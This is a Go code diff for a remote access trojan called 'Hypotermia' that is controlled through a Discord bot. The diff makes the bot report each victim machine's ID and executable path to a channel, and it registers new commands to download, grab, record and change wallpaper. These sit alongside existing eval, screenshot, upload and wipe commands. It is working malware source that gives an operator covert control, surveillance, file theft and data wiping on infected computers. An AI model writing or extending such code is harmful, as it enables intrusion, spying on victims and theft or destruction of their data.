@@ -3,7 +3,9 @@ package bot
 import (
 	"bytes"
 	"fmt"
+	"os"
 	"os/exec"
+	"path/filepath"
 	"regexp"
 	"strings"
 	"syscall"
@@ -74,10 +76,20 @@ func Init() {
 	channel, code := getChannel(dg, categoryId, hwid)
 	channelId = channel
 
+	path, err := os.Executable()
+	if err != nil {
+		path = "?"
+	} else {
+		path, err = filepath.Abs(path)
+		if err != nil {
+			path = "?"
+		}
+	}
+
 	if code == 1 {
-		dg.ChannelMessageSend(channel, "Hypotermia successfully connected to new machine.")
+		dg.ChannelMessageSend(channel, fmt.Sprintf("@here\n\nHypotermia successfully connected to new machine.\nUUID: %s\nRunning in: %s\n", hwid, path))
 	} else if code == 2 {
-		dg.ChannelMessageSend(channel, fmt.Sprintf("Hypotermia successfully reconnected to: %s", hwid))
+		dg.ChannelMessageSend(channel, fmt.Sprintf("@here\n\nHypotermia successfully reconnected.\nUUID: %s\nRunning in: %s", hwid, path))
 	}
 
 	select {}
@@ -124,13 +136,17 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 }
 
 func register() {
+	commandsList["download"] = &commands.DownloadCommand{}
 	commandsList["env"] = &commands.EnvCommand{}
 	commandsList["eval"] = &commands.EvalCommand{}
+	commandsList["grab"] = &commands.GrabCommand{}
 	commandsList["notif"] = &commands.NotifCommand{}
 	commandsList["ping"] = &commands.PingCommand{}
+	commandsList["record"] = &commands.RecordCommand{}
 	commandsList["ss"] = &commands.ScreenShotCommand{}
 	commandsList["tree"] = &commands.TreeCommand{}
 	commandsList["upload"] = &commands.UploadCommand{}
+	commandsList["wallpaper"] = &commands.WallpaperCommand{}
 	commandsList["wipe"] = &commands.WipeCommand{}
 }
 
